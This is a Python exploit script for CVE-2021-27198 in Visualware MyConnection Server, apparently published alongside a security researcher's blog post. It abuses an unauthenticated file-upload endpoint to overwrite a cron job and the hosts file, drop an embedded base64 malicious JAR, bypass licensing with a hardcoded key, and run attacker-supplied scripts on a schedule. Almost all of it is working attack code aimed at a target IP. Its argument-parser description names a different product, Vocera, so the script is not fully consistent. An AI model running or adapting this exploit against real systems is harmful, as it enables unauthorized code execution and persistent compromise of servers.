##################################################################################################
# Description: Visualware MyConnection Server RCE - CVE-2021-27198
# Reference: https://www.securifera.com/blog/2023/10/25/cve-2021-27198/
# Author: b0yd - @rwincey - www.securifera.com
# Usage: python3 CVE-2021-27198.py -u  <TARGET IP> -e -o Linux
#
##################################################################################################

import argparse
import urllib
import requests
import random
import string
import base64

proxies = None
#Comment out if not using a proxy like Burp, etc
# proxies = {
 # 'http': 'http://127.0.0.1:8080',
 # 'https': 'http://127.0.0.1:8080',
# }

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
                      
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

# JAR that contains rtaplugin "error" class that attempts to execute a file at /tmp/c.bat
base64_jar = 'UEsDBBQAAAAAAAAAAABlZRVCcwIAAHMCAAAcAAAAcnRhcGx1Z2lucy9lcnJvci9lcnJvci5jbGFzc8r+ur4AAAAzAC0KAAwAGAgAGQkACwAaCAAbBwAcCgAFAB0KAAUAHgoAHwAgCgAfACEHACIHACMHACQBAAFhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHACMHACIBAApTb3VyY2VGaWxlAQAKZXJyb3IuamF2YQwADwAQAQAISEVSRW1Dd2sMAA0ADgEACi90bXAvYy5iYXQBAAxqYXZhL2lvL0ZpbGUMAA8AJQwAJgAnBwAoDAApACoMACsALAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABZydGFwbHVnaW5zL2Vycm9yL2Vycm9yAQAQamF2YS9sYW5nL09iamVjdAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADXNldEV4ZWN1dGFibGUBAAQoWilaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAsADAAAAAEAAgANAA4AAAABAAEADwAQAAEAEQAAAHkAAwACAAAAJyq3AAEqEgK1AAMSBEy7AAVZK7cABgS2AAdXuAAIK7YACVenAARMsQABAAoAIgAlAAoAAgASAAAAIgAIAAAAEgAEABEACgAUAA0AFQAaABYAIgAYACUAFwAmABkAEwAAABAAAv8AJQABBwAUAAEHABUAAAEAFgAAAAIAF1BLAQIUAxQAAAAAAAAASFdlZRVCcwIAAHMCAAAcAAAAAAAAAAAAAAAAADAAAABydGFwbHVnaW5zL2Vycm9yL2Vycm9yLmNsYXNzUEsFBgAAAAABAAEASgAAAN0CAAAAAA=='

def id_generator(size=12, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def upload_file(target, tmp_file_name, file_contents):

    data = file_contents    
    r = requests.post('http://%s/myspeed/sf?filename=%s' % (target,tmp_file_name), proxies=proxies, verify=False, headers=headers, data=data)
    if r.status_code == 200:
        return True
    else:
        return False
        
def upload_plugin_via_cron(target):

    tmp_file_name = id_generator(12)    
    
    # Upload marker file
    ret = upload_file(target, tmp_file_name, "")
    if ret:
        # Attempts to execute the file at /tmp/c.bat
        payload ='''base64_content="%s"
found_file=$(find / -type f -name "%s" -print -quit 2>/dev/null)
if [ ! -z "$found_file" ]; then
    parent_dir=$(dirname "$found_file")
    new_path="$parent_dir/plugins/error/rta/errorrtaplugin.jar"
    echo "$base64_content" | base64 -d > "$new_path"
    rm "$found_file"
    mv /etc/cron.hourly/0anacron.bak /etc/cron.hourly/0anacron
    chmod 755 /etc/cron.hourly/0anacron
else
    echo "File not found"
fi
        ''' % (base64_jar, tmp_file_name)
        
        ana_cron = '''#!/bin/sh
# Check whether 0anacron was run today already
%s
if test -r /var/spool/anacron/cron.daily; then
    day=`cat /var/spool/anacron/cron.daily`
fi
if [ `date +%%Y%%m%%d` = "$day" ]; then
    exit 0;
fi

# Do not run jobs when on battery power
if test -x /usr/bin/on_ac_power; then
    /usr/bin/on_ac_power >/dev/null 2>&1
    if test $? -eq 1; then
    exit 0
    fi
fi
''' % payload
            
        # Upload cron job
        upload_file(target, "/etc/cron.hourly/0anacron", ana_cron)
        
        ana_cron_bak = '''#!/bin/sh
# Check whether 0anacron was run today already
if test -r /var/spool/anacron/cron.daily; then
    day=`cat /var/spool/anacron/cron.daily`
fi
if [ `date +%%Y%%m%%d` = "$day" ]; then
    exit 0;
fi

# Do not run jobs when on battery power
if test -x /usr/bin/on_ac_power; then
    /usr/bin/on_ac_power >/dev/null 2>&1
    if test $? -eq 1; then
    exit 0
    fi
fi
'''
    
        # Upload cron job
        upload_file(target, "/etc/cron.hourly/0anacron.bak", ana_cron_bak)
        print("[-] Sucessfully uploaded cron file with plugin payload")

def activate_server(target, os_type, user, pw):
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import time

    host_file_contents = '''1.1.1.1 SeCuRe.vIsUaLwArE.CoM.\n'''    
    if os_type.lower() == 'windows':
        file_path = '/Windows/System32/drivers/etc/hosts'
    else:
        file_path = '/etc/hosts'
    
    if upload_file(target, file_path, host_file_contents):        
        print("[-] Sucessfully uploaded modified hosts file")
        
        data = { 'user':user, 'pass': pw }
        r = requests.post('http://%s/myspeed/login' % (target), proxies=proxies, verify=False, headers=headers, data=data, allow_redirects=False)
        rheaders = r.headers
        if 'Location' in rheaders:
            loc = rheaders['Location'].strip()
            if loc != '/myspeed/admin':
                print("[-] Login failed")
                return False
        else:
            print("[-] No Location header in response")
            return False
                
        # Get session cookie
        uid = r.cookies.get('uid', default=None)
        if uid:      
            headers['Cookie'] = 'uid=%s' % uid
            
            r = requests.get('http://%s/myspeed/admin/activatenewlicensekey?knum=1&key=MCS-V11P-1Lmph2bTePNJb12BIpXv6whMSiSm5AOoxcnSa0hkI9sb' % (target), proxies=proxies, verify=False, headers=headers)
            data = r.text
            if 'Activated' in data:
                print("[+] Sucessfully activated server software")
                return True
            elif 'Failed' in data:
                print("[-] Failed activating server software")
            else:
                print("[-] Unknown response")
                return False
        else:
            print("[-] No uid cookie in response")
            return False
            

        
if __name__ == '__main__':

    # Setup arguments
    parser = argparse.ArgumentParser(description='Remote command execution via task scheduler on Vocera report console.')
    parser.add_argument('-t', dest='target', help='Target IP or domain', required=True)
    parser.add_argument('-o', dest='os_type', help='Target operating system. (Windows, Nix-based)', required=True)
    parser.add_argument('-a', dest='activate', help='Activate the server', action='store_true')
    parser.add_argument('-e', dest='exploit', help='Upload exploit payload', action='store_true')
    parser.add_argument('-f', dest='script_file', help='Script file to execute')
    parser.add_argument('-u', dest='user', help='User', default='admin')
    parser.add_argument('-p', dest='pw', help='User password', default='admin123')

    # Parse out arguments
    args = parser.parse_args()
    
    # Get the target OS type
    os_type = args.os_type    
    if args.activate:
        activate_server(args.target, os_type, args.user, args.pw )        
    
    if args.exploit:
        if os_type.lower() == 'windows':
            data = base64.b64decode(base64_jar)
            if upload_file(args.target, "plugins/error/rta/errorrtaplugin.jar", data):
                print("[-] Sucessfully uploaded JAR payload")            
        else:
            upload_plugin_via_cron(args.target)
    
    if args.script_file:
        # Upload script, if the plugin is in place and the product is licensed, this should execute every couple minutes
        f = open(args.script_file, 'rb')
        data = f.read()
        f.close()
        
        if upload_file(args.target, "/tmp/c.bat", data):        
            print("[-] Sucessfully uploaded script to be executed")

